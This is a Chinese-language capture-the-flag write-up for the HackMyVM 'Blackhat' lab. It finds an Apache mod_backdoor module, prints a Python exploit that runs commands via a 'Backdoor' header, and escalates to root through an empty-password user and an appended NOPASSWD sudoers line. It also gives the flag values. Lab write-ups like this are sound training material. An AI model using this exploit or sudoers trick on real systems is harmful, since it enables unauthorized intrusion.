# Blackhat

2025.02.16 https://hackmyvm.eu/machines/machine.php?vm=Blackhat

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
80/tcp open  http
```

只有一个 web，gobuster 扫描看到 2 个文件：

```
http://192.168.5.40/image.jpg            (Status: 200) [Size: 13314]
http://192.168.5.40/phpinfo.php          (Status: 200) [Size: 69318]
```

phpinfo.php 中源码没有隐藏信息，在看 php 的配置信息时发现 Loaded Modules 中有一个 mod_backdoor 模块，搜索一下看看时什么不常见的模块，经过搜索，发现了一个可以进行漏洞利用的 exp：

https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor/blob/main/exploit.py

```python
import requests
import sys


def exploit(host, port, command):
    headers = {"Backdoor": command}
    url = f"http://{host}:{port}/"
    response = requests.get(url, headers=headers)
    text = response.text
    print(text)


def main():
    if len(sys.argv) != 3:
        print("Usage : ")
        print("\tpython %s [HOST] [PORT]" % (sys.argv[0]))
        exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    while True:
        command = input("$ ")
        if command == "exit":
            break
        exploit(host, port, command)


if __name__ == "__main__":
    main()
```

执行后，得到了 shell 执行权限：

```
python3 exploit.py 192.168.5.40 80
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

进行系统枚举，linpeas 没发现其他有用信息，发现 /etc/sudoers 文件设置过 acl：

```
getfacl -R -s -p / 2>/dev/null

# file: //etc/sudoers
# owner: root
# group: root
user::r--
user:darkdante:rw-
group::r--
mask::rw-
other::---
```

发现 darkdante 用户可以对 sudoers 文件修改，同时其他什么信息都没有，只有尝试 su 切换到 darkdante 看看能不能行，然后 darkdante 用户是空密码就可以切换，所以先得到了 user flag：

```
su darkdante
darkdante@blackhat:~$ cat user.txt
89fac491dc9bdc5fc4e3595dd396fb11
```

然后直接写权限到 sudoers 文件中：

```
darkdante@blackhat:~$ echo 'darkdante ALL=(ALL)NOPASSWD:ALL' >> /etc/sudoers
darkdante@blackhat:~$ sudo su
root@blackhat:/home/darkdante# cd /root
root@blackhat:~# ls
root.txt
root@blackhat:~# cat root.txt
8cc6110bc1a0607015c354a459468442
```

最后回顾下 /etc/shadow 发现 darkdante 用户的第二个字段为空，根本就没有设置密码，`darkdante::19307:0:99999:7:::`。
